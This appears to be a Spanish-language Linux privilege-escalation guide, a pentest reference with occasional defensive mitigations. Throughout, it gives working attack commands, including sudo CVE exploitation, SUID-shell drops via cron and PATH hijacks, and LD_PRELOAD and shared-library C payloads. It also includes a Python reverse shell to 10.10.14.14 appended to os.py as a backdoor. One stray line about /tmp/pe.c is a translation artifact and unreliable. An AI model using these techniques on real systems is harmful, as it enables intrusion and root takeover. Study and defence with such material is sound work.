...
Para obtener un contexto más amplio y conocer los flujos históricos de enumeración, consulta g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation y linux-private-i, incluidos en las referencias.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Información del sistema

### Información del SO

Comencemos obteniendo algunos conocimientos sobre el SO en ejecución
```bash
...
Si **tienes permisos de escritura en alguna carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas libraries o binaries:
```bash
echo $PATH
```
...
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
...
Para extraer todas las versiones vulnerables del kernel de ese sitio web, puedes hacer lo siguiente:
```bash
...
Siempre **busca la versión del kernel en Google**; quizá tu versión del kernel esté escrita en algún exploit del kernel y así tendrás la certeza de que este exploit es válido.
...
Según las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
...
Aquí tienes un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que admita la funcionalidad `chroot`.

Para obtener más información, consulta el [aviso original de la vulnerabilidad](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo anterior a 1.9.17p1 (rango afectado indicado: **1.8.8–1.9.17**) puede evaluar reglas de sudoers basadas en el host utilizando el **nombre de host proporcionado por el usuario** mediante `sudo -h <host>` en lugar del **nombre de host real**. Si sudoers concede privilegios más amplios en otro host, puedes **suplantar** ese host localmente.<sup>[[29]](#references)</sup>
...
```
Explotar mediante spoofing del host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la resolución del nombre falsificado se bloquea, añádelo a `/etc/hosts` o usa un hostname que ya aparezca en logs/configs para evitar las consultas DNS.
...
sudo -u#-1 /bin/bash
```
### Dmesg: la verificación de la firma falló
...
```
Además, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún exploit del kernel, ya que se recomienda compilarlo en la máquina donde vayas a utilizarlo (o en una similar).
```bash
...
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software obsoleto y vulnerable instalado dentro de la máquina.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares que comprueben si alguna versión del software instalado es vulnerable a exploits conocidos_

## Procesos

Observa **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutándose como root?).
```bash
ps aux
ps -ef
top -n 1
```
Comprueba siempre si hay [**electron/cef/chromium debuggers** ejecutándose; podrías abusar de ellos para escalar privilegios](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta comprobando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
Comprueba también **tus privilegios sobre los binarios de los procesos**; quizá puedas sobrescribir alguno.

### Cadenas padre-hijo entre usuarios

Un proceso hijo que se ejecuta bajo un **usuario diferente** al de su padre no es automáticamente malicioso, pero es una **señal útil para el triage**. Algunas transiciones son esperadas (`root` iniciando un usuario de servicio, gestores de inicio de sesión creando procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, helpers de depuración, persistencia o límites de confianza débiles en el runtime.
...
pstree -alp
```
Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo, argumentos modificables). En varias rutas reales de privesc, el proceso hijo no se podía modificar, pero sí la **configuración controlada por el proceso padre** o la cadena de scripts auxiliares.

### Ejecutables eliminados y archivos abiertos eliminados

Los artefactos de ejecución suelen seguir siendo accesibles **después de su eliminación**. Esto resulta útil tanto para la escalada de privilegios como para recuperar evidencias de un proceso que ya tiene archivos sensibles abiertos.
...
```
Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Es una señal clara que se debe investigar porque:
...
- un binario privilegiado eliminado puede indicar una manipulación reciente o un intento de limpieza

Recopila globalmente los archivos deleted-open:
```bash
lsof +L1
```
...
cat /proc/<PID>/fd/<FD>
```
Esto es especialmente valioso cuando un proceso todavía tiene abierto un secret, script, database export o flag file eliminado.
...
> - **kernel.yama.ptrace_scope = 1**: solo se puede depurar un proceso principal.
> - **kernel.yama.ptrace_scope = 2**: solo un administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede rastrear ningún proceso con ptrace. Una vez establecido, es necesario reiniciar el sistema para volver a habilitar ptrace.
...
Para un ID de proceso determinado, **maps muestra cómo está mapeada la memoria dentro del** espacio de direcciones virtuales **de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la memoria del proceso**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **buscar posiciones dentro del archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
...
Por lo general, `/dev/mem` solo puede ser leído por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump es una reinterpretación para Linux de la herramienta clásica ProcDump de la suite de herramientas Sysinternals para Windows. Consíguela en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
Si encuentras que el proceso de autenticación se está ejecutando:
```bash
...
| Apache2 (sesiones activas de autenticación HTTP Basic)         | apache2              |
...
### Crontab UI (alseambusher) ejecutándose como root – privesc mediante scheduler basado en web

Si un panel web de “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está vinculado a loopback, aún puedes acceder a él mediante SSH local port-forwarding y crear un trabajo privilegiado para escalar privilegios.<sup>[[1]](#references)[[4]](#references)</sup>

Cadena típica
- Descubrir el puerto accesible únicamente desde loopback (por ejemplo, 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Backups/scripts con `zip -P <password>`
- Unidad de systemd que exponga `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear el túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job de alta privilegio y ejecútalo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
...
- Vincúlalo a localhost y restringe además el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incrustar secretos en los archivos de unidad; usa almacenes de secretos o un EnvironmentFile accesible únicamente por root
- Habilita la auditoría y el logging para las ejecuciones de trabajos bajo demanda

Comprueba si algún trabajo programado es vulnerable. Quizá puedas aprovecharte de que un script se ejecute como root (¿wildcard vuln? ¿puedes modificar archivos que use root? ¿usar symlinks? ¿crear archivos específicos en el directorio que utiliza root?).
```bash
crontab -l
...
- Por qué funciona: En Bash, las expansiones se realizan en este orden: expansión de parámetros/variables, sustitución de comandos, expansión aritmética y, después, división de palabras y expansión de nombres de ruta. Por lo tanto, un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando) y, después, el `0` numérico restante se utiliza para la aritmética, de modo que el script continúa sin errores.
...
- Explotación: Haz que se escriba texto controlado por el atacante en el log analizado, de modo que el campo con apariencia numérica contenga una sustitución de comandos y termine con un dígito. Asegúrate de que tu comando no escriba en stdout (o redirígelo) para que la expresión aritmética siga siendo válida.
```bash
...
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso total**, quizá sea útil eliminar esa carpeta y **crear un directorio de enlace simbólico hacia otro** que contenga un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de enlaces simbólicos y manejo más seguro de archivos
...
- `stat()` sigue un enlace simbólico y devuelve los metadatos del destino.
...
```
Para defensores/desarrolladores, los patrones más seguros contra los trucos con symlinks incluyen:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea links/archivos precreados por el atacante).
...
### Binarios de cron firmados a medida con payloads modificables

Los equipos blue team a veces "firman" los binarios ejecutados por cron volcando una sección ELF personalizada y buscando mediante grep una cadena del vendor antes de ejecutarlos como root. Si ese binario permite escritura al grupo (por ejemplo, `/opt/AV/periodic-checks/monitor`, propiedad de `root:devs 770`) y puedes hacer leak del material de firma, puedes falsificar la sección y secuestrar la tarea de cron:<sup>[[2]](#references)</sup>
...
2. Recrea el certificado esperado usando la key/config filtrada (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construye un reemplazo malicioso (por ejemplo, dejar una bash SUID o añadir tu SSH key) e incrusta el certificado en `.text_sig` para que el grep tenga éxito:
```bash
...
```
4. Sobrescribe el binario programado conservando los execute bits:
```bash
...
### Tareas frecuentes de cron

Puedes monitorizar los procesos para buscar procesos que se ejecuten cada 1, 2 o 5 minutos. Quizás puedas aprovecharte de ello para escalar privilegios.
...
Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes colocar un binario **SUID/SGID** que se volverá a copiar como **root:root**, con los mismos bits de modo, en el resultado del backup.<sup>[[26]](#references)</sup>
...
- Confirma que el clúster de origen (por ejemplo, `/var/lib/postgresql/14/main`) permite escritura por tu parte y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después de ejecutarse el trabajo.
...
Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin carácter de nueva línea), y el cron job funcionará. Ejemplo (observa el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar este tipo de entrada sigilosa, inspecciona los archivos cron con herramientas que muestren los caracteres de control:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
...
Comprueba si puedes escribir en algún archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizá debas esperar hasta que la máquina se reinicie).\
...
Ten en cuenta que, si tienes **permisos de escritura sobre los binarios ejecutados por los servicios**, puedes modificarlos para incluir backdoors, de modo que estos se ejecuten cuando los servicios vuelvan a ejecutarse.
...
```
A continuación, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de la carpeta PATH de systemd en la que puedas escribir y, cuando se solicite al servicio que ejecute la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **backdoor** (los usuarios sin privilegios normalmente no pueden iniciar/detener servicios, pero comprueba si puedes usar `sudo -l`).

**Obtén más información sobre los servicios con `man systemd.service`.**

## **Timers**

Los **Timers** son archivos de unidades de systemd cuyo nombre termina en `**.timer**` y que controlan archivos `**.service**` o eventos. Los **Timers** pueden utilizarse como alternativa a cron, ya que incluyen compatibilidad integrada con eventos de tiempo de calendario y eventos de tiempo monótonos, y pueden ejecutarse de forma asíncrona.
...
Si puedes modificar un temporizador, puedes hacer que ejecute alguna de las unidades de `systemd.unit` (como un `.service` o un `.target`).
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la Unit:

> La unidad que se activará cuando expire este timer. El argumento es un nombre de unidad cuyo sufijo no es ".timer". Si no se especifica, este valor toma como predeterminado un servicio que tiene el mismo nombre que la unidad del timer, excepto por el sufijo. (Consulta lo anterior). Se recomienda que el nombre de la unidad activada y el nombre de la unidad del timer sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso, tendrías que:

- Encontrar alguna unidad de systemd (como un `.service`) que esté **ejecutando un binario escribible**
- Encontrar alguna unidad de systemd que esté **ejecutando una ruta relativa** y sobre la que tengas **permisos de escritura** en el **PATH de systemd** (para suplantar ese ejecutable)
...
- `Accept`: Acepta un argumento booleano. Si es **true**, se **inicia una instancia del servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se inicia una unidad de servicio para todas las conexiones. Este valor se ignora en sockets de datagramas y FIFOs, donde una única unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por motivos de rendimiento, se recomienda escribir nuevos daemons únicamente de forma compatible con `Accept=no`.
...
- `Service`: Especifica el nombre de la unidad de **service** que se **activará** ante **tráfico entrante**. Esta configuración solo está permitida para sockets con Accept=no. Por defecto, utiliza el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario utilizar esta opción.
...
### Activación de sockets + ruta de unidad modificable (crear un service inexistente)

Otra misconfiguration de alto impacto es:

- una unidad de socket con `Accept=no` y `Service=<name>.service`
- la unidad de service referenciada no existe
- un atacante puede escribir en `/etc/systemd/system` (u otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service` y, a continuación, generar tráfico hacia el socket para que systemd cargue y ejecute el nuevo service como root.
...
Cuando la CLI de Docker no está disponible, el socket de Docker aún puede abusarse mediante HTTP sin procesar sobre el socket de Unix. El flujo más fiable es:

- crear un contenedor auxiliar de larga duración con el directorio raíz del host montado mediante bind
- iniciarlo
- crear una instancia de `exec` dentro de ese contenedor auxiliar
- iniciar la instancia de `exec` y leer la salida mediante la API
...
```
Este patrón suele ser más robusto que intentar ejecutar `attach` manualmente con `socat` o `nc -U`. Una vez que puedes crear un helper con `/:/host`, puedes usar instancias adicionales de `exec` para leer archivos como `/host/root/...`, añadir claves SSH en `/host/root/.ssh` o modificar archivos de inicio del host.
...
El sistema es versátil y admite IPC básico, lo que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, permite difundir eventos o señales, facilitando la integración entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Asimismo, D-Bus admite un sistema de objetos remotos, lo que simplifica las solicitudes de servicio y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona mediante un **modelo de allow/deny**, gestionando los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) según el efecto acumulativo de las reglas de policy coincidentes. Estas policies especifican las interacciones con el bus y pueden permitir una escalada de privilegios mediante la explotación de estos permisos.

Un ejemplo de este tipo de policy en `/etc/dbus-1/system.d/wpa_supplicant.conf` especifica los permisos del usuario root para poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las policies sin un usuario o grupo especificado se aplican universalmente, mientras que las policies del contexto "default" se aplican a todo lo que no esté cubierto por otras policies específicas.
```xml
<policy user="root">
...
lsof -i
```
### Triaje rápido del filtrado saliente
...
```
Clasifica los listeners según el objetivo de bind:
...
### Flujo de trabajo para el triage de servicios solo locales
...
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como escáner de red (modo solo red)

Además de las comprobaciones locales de PE, linPEAS puede ejecutarse como un escáner de red enfocado. Utiliza los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.
```bash
...
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omitiendo el resto de las comprobaciones de escalada de privilegios).
...
ip -br addr
```
Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios accesibles solo internamente exponen tokens/cookies/credenciales allí:
```bash
...
Comprueba si eres **miembro de algún grupo** que pueda concederte privilegios de root:
...
Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando dicha contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force contra usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
...
Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, es posible que puedas escalar privilegios **creando un backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por un usuario diferente (idealmente root) y que **no se cargue desde una carpeta ubicada anteriormente** a tu carpeta escribible en $PATH.

### SUDO y SUID

Es posible que tengas permitido ejecutar algún comando usando sudo o que estos tengan el bit suid. Compruébalo usando:
```bash
...
```
Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una librería arbitraria de Python mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Envenenamiento de `__pycache__` / `.pyc` escribible en imports de Python permitidos mediante sudo

Si un **script de Python permitido mediante sudo** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` escribible**, es posible que puedas reemplazar el `.pyc` almacenado en caché y conseguir ejecución de código como el usuario privilegiado en el siguiente import.<sup>[[30]](#references)</sup>

- Por qué funciona:
- CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- El intérprete valida la **cabecera** (metadatos de magic + timestamp/hash vinculados al source) y, después, ejecuta el objeto de código marshalizado almacenado tras dicha cabecera.
- Si puedes **eliminar y recrear** el archivo almacenado en caché porque el directorio es escribible, aún puedes reemplazar un `.pyc` propiedad de root pero no escribible.
- Ruta típica:
...
- El directorio `__pycache__` del módulo importado es escribible por tu usuario o por todos.
...
3. Compila un objeto de código payload, aplica `marshal.dumps(...)`, elimina el archivo de caché original y vuelve a crearlo con el encabezado original seguido de tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que la importación ejecute tu payload como root.

Notas importantes:

- Reutilizar el encabezado original es esencial porque Python comprueba los metadatos de caché con respecto al archivo fuente, no si el cuerpo del bytecode coincide realmente con el código fuente.
...
- Asegúrate de que ningún directorio de la ruta de importación de Python con privilegios tenga permisos de escritura para usuarios con pocos privilegios, incluido `__pycache__`.
- Para ejecuciones con privilegios, considera usar `PYTHONDONTWRITEBYTECODE=1` y realizar comprobaciones periódicas en busca de directorios `__pycache__` con permisos de escritura inesperados.
- Trata los módulos locales de Python y los directorios de caché con permisos de escritura de la misma forma que tratarías los shell scripts o las shared libraries con permisos de escritura que ejecuta root.
...
- Por qué funciona: En los shells no interactivos, Bash evalúa `$BASH_ENV` y hace source de ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un shell wrapper. Si sudo conserva `BASH_ENV`, tu archivo se ejecuta con privilegios de root.<sup>[[23]](#references)</sup>
...
- Considera el registro de E/S de sudo y las alertas cuando se utilicen variables de entorno conservadas.
...
```
Terraform fallará durante el handshake del plugin de Go, pero ejecutará el payload como root antes de detenerse, dejando atrás una shell SUID.

### Bypass de validación de symlinks + sobrescrituras de TF_VAR

Las variables de Terraform pueden proporcionarse mediante variables de entorno `TF_VAR_<name>`, que persisten cuando sudo conserva el entorno. Las validaciones débiles, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, pueden evadirse mediante symlinks:<sup>[[25]](#references)</sup>
```bash
...
```
Terraform resuelve el symlink y copia el `/root/root.txt` real a un destino legible por el atacante. El mismo enfoque puede utilizarse para **escribir** en rutas privilegiadas mediante la creación previa de symlinks de destino (por ejemplo, apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).
...
Defaults !requiretty
```
Esto no es una vulnerabilidad directa por sí sola, pero amplía las situaciones en las que las reglas de sudo pueden abusarse sin necesitar una PTY completa.

### Sudo env_keep+=PATH / secure_path inseguro → PATH hijack

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contiene entradas escribibles por el atacante (por ejemplo, `/home/<user>/bin`), cualquier comando relativo dentro del objetivo permitido por sudo puede ser suplantado.<sup>[[3]](#references)</sup>

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que invoque comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH escribible que se busque primero.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
...
```
### Elusión de rutas de ejecución de Sudo
...
```
Entonces, cuando ejecutes el binario suid, se ejecutará esta función

### Script escribible ejecutado por un wrapper SUID

Una configuración incorrecta común en una aplicación personalizada es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el propio script puede ser modificado por usuarios con pocos privilegios.
...
```
Este vector de ataque es especialmente común en wrappers de "maintenance"/"backup" incluidos en `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más shared libraries (archivos .so) que el loader cargará antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como preloading de una library.
...
- El loader ignora **LD_PRELOAD** en los ejecutables cuyo ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- En los ejecutables con suid/sgid, solo se preloadan las libraries ubicadas en rutas estándar que también tienen suid/sgid.
...
```
No se proporcionó contenido para guardar en `/tmp/pe.c`.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
...
```
Finalmente, **eleva privilegios** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Se puede abusar de un privesc similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, porque controla la ruta donde se buscarán las bibliotecas.
```c
#include <stdio.h>
#include <stdlib.h>
...
Al encontrar un binario con permisos **SUID** que parezca inusual, es recomendable comprobar si está cargando correctamente archivos **.so**. Esto se puede verificar ejecutando el siguiente comando:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrarse con un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere una posible oportunidad de explotación.
...
```
Este código, una vez compilado y ejecutado, pretende elevar privilegios manipulando los permisos de los archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería activar el exploit, lo que podría permitir comprometer el sistema.
...
[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que un atacante puede explotar para evadir las restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios de Unix que pueden abusarse para escapar de restricted shells, escalar o mantener privilegios elevados, transferir archivos, generar bind y reverse shells, y facilitar otras tareas de post-exploitation.
...
### Reutilización de Sudo Tokens

En casos en los que tienes **acceso a sudo**, pero no la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y secuestrando después el session token**.<sup>[[18]](#references)</sup>
...
- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el sudo token en tu sesión** (no obtendrás automáticamente un root shell; ejecuta `sudo su`):
```bash
bash exploit.sh
...
Si tienes **permisos de escritura** en la carpeta o sobre cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un sudo token para un usuario y un PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes un shell como ese usuario con el PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo:
```bash
...
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes explotar este permiso
```bash
...
```
Si `doas` permite un editor o intérprete, comprueba escapes estilo GTFOBins:
```bash
doas vim
:!/bin/sh
```
...
Si sabes que un **usuario normalmente se conecta a una máquina y usa `sudo`** para escalar privilegios y has obtenido una shell dentro del contexto de ese usuario, puedes **crear un nuevo ejecutable sudo** que ejecute tu código como root y después el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta en .bash_profile) para que, cuando el usuario ejecute sudo, se ejecute tu ejecutable sudo.
...
Si por algún motivo **un usuario tiene permisos de escritura** sobre cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración de `/etc/ld.so.conf.d/*.conf`, podría conseguir escalar privilegios.\
...
```
### Backdoor de ACL oculto en archivos drop-in de sudoers
...
```
![secuestro de sesiones de screen - Ubicaciones de sockets (algunos sistemas exponen una como enlace simbólico de la otra): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
...
Esto era un problema de las **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como usuario sin privilegios.
...
```
![Ubicaciones de los sockets (algunos sistemas exponen uno como symlink del otro) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Listar usando ese socket; puedes iniciar una sesión de tmux en ese socket...](<../../images/image (837).png>)
...
Este bug se produce al crear una nueva clave ssh en esos sistemas operativos, ya que **solo eran posibles 32.768 variaciones**. Esto significa que se pueden calcular todas las posibilidades y que, **teniendo la clave pública ssh, puedes buscar la clave privada correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
...
- **PermitEmptyPasswords**: Cuando se permite la autenticación mediante contraseña, especifica si el servidor permite iniciar sesión en cuentas con contraseñas vacías. El valor predeterminado es `no`.

### Login control files

Estos archivos determinan quién puede iniciar sesión y cómo:

- **`/etc/nologin`**: si está presente, bloquea los inicios de sesión que no sean de root y muestra su mensaje.
- **`/etc/securetty`**: restringe dónde puede iniciar sesión root (lista de TTY permitidas).
- **`/etc/motd`**: banner posterior al inicio de sesión (puede filtrar información del entorno o de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión mediante ssh; el valor predeterminado es `no`. Valores posibles:

- `yes`: root puede iniciar sesión usando una contraseña y una clave privada
...
Especifica los archivos que contienen las claves públicas que se pueden utilizar para la autenticación de usuarios. Puede contener tokens como `%h`, que se reemplazarán por el directorio personal. **Puedes indicar rutas absolutas** (que comiencen por `/`) o **rutas relativas al directorio personal del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que, si intentas iniciar sesión con la clave **private** del usuario "**testusername**", ssh comparará la clave pública de tu clave con las ubicadas en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH permite **usar tus claves SSH locales en lugar de dejar las claves** (¡sin passphrases!) almacenadas en tu servidor. Así, podrás **saltar** mediante ssh **a un host** y, desde allí, **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.
...
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario se conecta a una máquina diferente, ese host podrá acceder a las claves (lo que supone un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent mediante la palabra clave `AllowAgentForwarding` (por defecto está permitido).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página, ya que **podrías aprovecharlo para escalar privilegios**:
...
Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden usar un nombre diferente o puede existir una copia de seguridad. Por lo tanto, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si contienen hashes**:
```bash
...
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio de Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
...
```
### Ubicación extraña/archivos con propietario extraño
```bash
...
Además, algunos **logs de auditoría** configurados de forma "**incorrecta**" (¿backdoored?) pueden permitirte **registrar contraseñas** dentro de los logs de auditoría, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
...
También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro de su **contenido**, y comprobar también si hay IPs y emails dentro de los logs, o regexps de hashes.\
...
Si sabes **desde dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta o **modificar las bibliotecas de python**, puedes modificar la biblioteca del OS y hacerle backdoor (si puedes escribir en el lugar donde se va a ejecutar el script de python, copia y pega la biblioteca os.py).

Para **hacerle backdoor a la biblioteca**, simplemente añade al final de la biblioteca os.py la siguiente línea (cambia la IP y el PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de logrotate

Una vulnerabilidad en `logrotate` permite que los usuarios con **permisos de escritura** sobre un archivo de log o sus directorios padre puedan obtener potencialmente privilegios elevados. Esto se debe a que `logrotate`, que a menudo se ejecuta como **root**, puede ser manipulado para ejecutar archivos arbitrarios, especialmente en directorios como _**/etc/bash_completion.d/**_. Es importante comprobar los permisos no solo en _/var/log_, sino también en cualquier directorio donde se aplique la rotación de logs.
...
